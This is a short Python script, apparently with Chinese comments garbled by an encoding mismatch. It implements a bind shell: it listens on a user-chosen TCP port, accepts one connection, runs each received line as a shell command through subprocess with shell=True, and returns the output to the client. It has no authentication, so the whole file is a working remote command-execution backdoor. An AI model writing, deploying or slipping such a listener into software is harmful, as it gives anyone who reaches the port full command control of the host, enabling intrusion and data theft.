# -*- coding: GBK -*-
import os
import argparse
import socket
import subprocess

def banner():
    usage = '''
    #######################################���ʵ����###################################
    ##################################################################################
    ##################################################################################
    '''
    print(usage)


# ��д��������ʾ
def listen_port():
    banner()
    parser = argparse.ArgumentParser()
    parser.add_argument('-p', '--port', dest='Port', help='���ؼ����Ķ˿�', type=int)
    return parser.parse_args().Port

def sock(port):
    print('listenning......')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('', port))      # �����˿�
    s.listen(1)             # �������ͻ�����������
    client_conn,addr = s.accept()      # �������ܿͻ������ӣ��������ȴ�����
    while True:
        recv_data = client_conn.recv(1024).decode()     # ����TCP���ݣ�1024��ʾΪһ�����ݽ��յĴ�С
        print(">>", recv_data)
        if recv_data == 'quit':
            break

        # os_data = os.popen(recv_data)       # �����ܵ�����ִ��ϵͳ����
        # os_result = os_data.read()          # ����ִ�������ó��Ľ��
        # print(os_result)                    # ��ӡ������
        # client_conn.sendall(os_result.encode())     # ������ִ�еĽ��ͬʱҲ���͸��ͻ���
        popen = subprocess.Popen(recv_data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        sout, serr = popen.communicate()
        sout = sout.decode('gbk')
        print(sout)
        client_conn.sendall(sout.encode())
    client_conn.close()
    s.close()


if __name__=='__main__':
    try:
        sock(listen_port())
    except TypeError:
        print('��鿴������Ϣ��-h')



